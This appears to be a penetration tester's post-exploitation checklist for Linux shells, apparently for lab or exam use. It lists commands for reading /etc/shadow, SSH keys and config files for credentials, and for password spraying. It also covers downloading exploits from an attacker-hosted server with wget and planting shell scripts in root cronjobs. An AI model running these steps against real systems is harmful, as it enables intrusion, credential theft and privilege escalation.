
> Run these the moment you land a shell.

### Situational awareness (first thing on every shell)

- [ ] `whoami` / `id` - who am I, what groups am I in
- [ ] `hostname`, `ip a` / `ifconfig` - where am I
- [ ] `route` / `ip route` - what we're routing through
- [ ] `arp -a` / `ip neigh` - stale and reachable addresses in the network
- [ ] `netstat -ano` - open ports and existing connections
- [ ] Upgrade a raw shell to a proper TTY before doing real work
- [ ] Grab proof of access now (`id` + `ip a` / `ipconfig`) — the thing that's easy to forget at the end

### Loot the current context

- [ ] `uname -a`, `cat /proc/version`, `cat /etc/issue` for basic system info 
- [ ] `lscpu` for basic cpu info
- [ ] `ps aux` for running tasks
- [ ] `/home/*` - check readable home dirs, `.bash_history`, SSH keys, stray notes
- [ ] `/etc/passwd; /etc/shadow` - which users exist, their password hashes
- [ ] `sudo -l` to see what I can execute as root (sudo) without a password
- [ ] App / web config files for hardcoded creds (`config.php`, `.env`, `wp-config.php`, etc.) - DB passwords are routinely reused for SSH and other services. A config file beats an exploit when it's there
- [ ] Every credential you find → try it on every service and every user (password reuse)

### Privilege escalation — vector hunting

- [ ] Kernel + OS version → search for a matching kernel exploit
- [ ] Scheduled tasks: `crontab -l` / `systemctl list-timers` / `ps`; or run `pspy` and leave it a while
- [ ] Enumerate credentials with `locate pass/pwd/passwd/password | more` or `grep -rnw '/' -ie "PASSWORD/PWD/PASSWD/PASS/..." --color=always 2> /dev/null`
- [ ] Looks for private keys: `locate id_rsa | more`
- [ ] check GTFOBINS
- [ ] Automated sweep: `LinPEAS` / `LinEnum` / `linux-exploit-suggester` / `linuxprivchecker`

### Applying a vector

- [ ] Transfer the exploit: `python3 -m http.server 80` (attacker) → `wget <IP>/<file>` (target) → `chmod +x <file>`
- [ ] Cronjob running as a higher privilege and writable? Drop your shell script in and wait
- [ ] Landed root? `whoami` / `id` to confirm, then grab proof